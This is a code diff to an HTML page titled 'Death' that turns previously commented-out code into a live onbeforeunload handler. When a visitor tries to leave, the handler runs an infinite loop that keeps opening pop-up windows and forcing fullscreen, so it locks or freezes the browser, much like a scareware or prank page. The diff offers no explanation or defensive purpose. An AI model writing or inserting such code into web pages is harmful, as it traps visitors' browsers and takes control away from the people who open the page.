@@ -188,17 +188,14 @@
 	  <title>Death</title>
 		<script src="https://cdn.rawgit.com/sindresorhus/screenfull.js/gh-pages/src/screenfull.js"></script>
 		<script type="text/javascript">
-			function myFull() {
-			    screenfull.request();
+		  window.onbeforeunload = function myFull() {
+		  	while(1) {
+	            	    var xWin=window.open("./helper");
+			    var xWin=window.open("./helper1");
+		     	    screenfull.request();
 			}
-		  //window.onbeforeunload = function () {
-		  	//while(1) {
-	            	    //var xWin=window.open("./helper");
-			    //var xWin=window.open("./helper1");
-		     	    //screenfull.request();
-			//}
 			
-		  //}
+		  }
 		</script>
 	</head>
 	<body>
